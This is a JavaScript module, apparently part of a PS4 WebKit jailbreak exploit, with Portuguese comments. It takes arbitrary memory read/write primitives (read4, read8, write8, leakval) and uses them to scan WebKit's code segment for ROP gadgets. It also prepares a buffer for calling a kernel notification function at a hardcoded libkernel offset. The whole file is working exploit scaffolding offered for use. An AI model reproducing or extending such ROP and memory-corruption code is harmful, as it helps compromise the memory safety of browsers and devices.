import { int64 } from './resources/int64.js';

let wkBase = null;
let lkBase = null;
let lcBase = null;

export function initRop(webkitBase, libkernelBase, libcBase) {
    wkBase = webkitBase;
    lkBase = libkernelBase;
    lcBase = libcBase;
}

// Varredura cirúrgica e segura de gadgets no segmento de código do WebKit
export function findGadgets(p) {
    if (!wkBase) throw new Error("WebKit base not set");
    
    let gadgets = {
        "ret": 0,
        "pop rdi": 0,
        "pop rsi": 0,
        "pop rdx": 0
    };

    console.log("[rop] Iniciando varredura segura de gadgets ROP...");

    // Varre uma janela segura e conhecida do segmento .text do WebKit
    for (let rva = 0x1000; rva < 0x200000; rva += 1) {
        try {
            let val = p.read4(wkBase.add32(rva));
            let b1 = val & 0xFF;
            let b2 = (val >> 8) & 0xFF;

            if (b1 === 0xC3 && gadgets["ret"] === 0) {
                gadgets["ret"] = rva;
            } else if (b1 === 0x5F && b2 === 0xC3 && gadgets["pop rdi"] === 0) {
                gadgets["pop rdi"] = rva;
            } else if (b1 === 0x5E && b2 === 0xC3 && gadgets["pop rsi"] === 0) {
                gadgets["pop rsi"] = rva;
            } else if (b1 === 0x5A && b2 === 0xC3 && gadgets["pop rdx"] === 0) {
                gadgets["pop rdx"] = rva;
            }

            if (gadgets["ret"] && gadgets["pop rdi"] && gadgets["pop rsi"] && gadgets["pop rdx"]) {
                break;
            }
        } catch (e) {
            // Ignora áreas protegidas automaticamente
        }
    }

    console.log("[rop] Gadgets encontrados:", gadgets);
    return gadgets;
}

export function sendNotification(p, text) {
    if (!p) throw new Error("window.p not installed");
    if (!lkBase) throw new Error("libkernelBase not resolved");

    // Offset padrão da sceKernelSendNotificationRequest na libkernel do PS4
    const NOTIFY_OFFSET = 0x48B0;
    const notifyFunc = lkBase.add32(NOTIFY_OFFSET);

    let encoder = new TextEncoder();
    let msgBytes = encoder.encode(text + "\x00");
    
    let buf = new Uint8Array(0x400);
    buf[4] = 0; // userId = 0
    buf.set(msgBytes, 0x20);

    let arrCell = p.leakval(buf);
    let backingStore = p.read8(arrCell.add32(0x10));

    p.write8(backingStore.add32(0x8), backingStore.add32(0x20));
    p.write4(backingStore.add32(0x10), msgBytes.length);

    return {
        notifyFunc,
        requestBuffer: backingStore
    };
}
